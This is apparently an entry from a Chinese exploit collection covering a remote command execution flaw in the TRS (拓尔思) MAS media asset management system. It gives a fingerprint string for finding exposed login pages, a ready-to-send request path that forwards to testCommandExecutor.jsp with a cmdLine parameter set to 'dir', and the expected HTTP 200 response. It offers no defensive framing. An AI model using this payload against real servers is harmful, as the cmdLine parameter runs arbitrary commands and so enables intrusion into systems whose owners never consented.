# 拓尔思MAStestCommandExecutor.jsp远程命令执行漏洞

拓尔思MAStestCommandExecutor.jsp ｜ 命令执行 ｜ —
- **指纹**：`"MAS媒资管理系统登录页面"`

**Payload**
```
/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=dir&workDir=&pathEnv=&libPathEnv=
```
- **响应特征**：200